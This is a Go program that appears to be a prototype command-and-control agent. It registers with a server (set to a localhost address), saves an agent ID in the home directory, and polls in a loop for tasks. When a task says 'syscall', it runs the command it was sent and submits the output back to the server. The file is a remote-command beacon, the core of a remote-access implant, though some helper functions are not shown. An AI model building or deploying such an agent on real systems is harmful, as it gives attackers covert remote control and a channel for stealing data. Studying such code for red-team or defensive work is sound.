package main

import (
	"log"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// TODO: client config file
var server = "http://127.0.0.1:8443/api/end/"
var pollingDelay = 5 * time.Second

func main() {
	log.Printf("The stones are capped.... Or whatever")
	//log.Printf("We'll be connecting to " + server)
	log.Printf("My hostname is " + GetHostname()) // Right now, on Windows we fail here (not exactly sure why. Didn't debug it for now)

	dirname, err := os.UserHomeDir()
	if err != nil {
		log.Fatal(err)
	}

	var fp = filepath.Join(dirname, ".agent_id")

	_, err = os.Stat(fp)
	var agent_id = ""

	if os.IsNotExist(err) {
		// No agent ID file
		log.Printf("We have not previously registered on the server.")
		agent_id = register(server)
		SaveAgentID(fp, agent_id)
		log.Printf("We are now registered on the server.")
	} else {
		log.Printf("We have already registered on the server.")
		cont, err := os.ReadFile(fp)
		if err != nil {
			log.Fatal(err)
		}
		agent_id = strings.TrimSpace(string(cont))
	}

	time.Sleep(pollingDelay)

	var running = true

	for running {
		log.Printf("Checking for tasks.....")

		var res = checkin(server, agent_id)

		if len(res) == 0 {
			log.Printf("No tasks found for me.")
		} else {
			log.Printf("Task found for me.")
			for i, task := range res {
				log.Printf("Task %d: %s", i+1, formatTask(task))

				// Now we'd have to decode the JSON of the tasks to do
				// Which should have an ID and command(s) to run
				var instruction = taskValue(task, "instruction")

				if instruction == "syscall" {
					var cmd = taskValue(task, "arg")
					log.Printf("Running " + cmd + " for task ID " + taskValue(task, "task_id"))

					var cmdout = GetCommandOutput(strings.Split(cmd, " "))

					result := cloneTask(task)
					updateTaskValue(result, "stdout", cmdout)
					updateTaskValue(result, "stderr", "")
					updateTaskValue(result, "exit_code", 0)
					updateTaskValue(result, "stopped_processing_at", time.Now().Format(time.RFC3339))
					updateTaskValue(result, "responded", true)

					_ = submitTaskResult(server, agent_id, result)
					log.Printf("Submitting task result for task ID " + taskValue(task, "task_id"))

				}

				// Then we would post it back

			}

		}

		time.Sleep(pollingDelay)
	}

}
